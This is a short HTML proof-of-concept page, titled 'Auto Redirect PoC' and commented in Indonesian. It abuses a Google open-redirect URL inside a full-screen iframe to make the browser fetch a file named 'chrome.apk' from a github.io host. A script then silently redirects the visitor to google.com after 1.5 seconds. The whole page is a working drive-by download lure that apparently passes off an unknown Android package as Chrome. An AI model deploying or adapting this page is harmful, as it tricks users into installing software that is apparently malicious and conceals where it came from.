<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Redirect PoC</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <!-- Iframe memuat URL yang Anda inginkan -->
    <iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" id="targetIframe"></iframe>

    <script>
        // Skrip untuk melakukan redirect halaman utama secara otomatis setelah beberapa milidetik / saat iframe dimuat
        setTimeout(function() {
            window.location.href = "https://www.google.com";
        }, 1500); // Penundaan 1.5 detik (bisa diubah sesuai kebutuhan)
    </script>

</body>
</html>
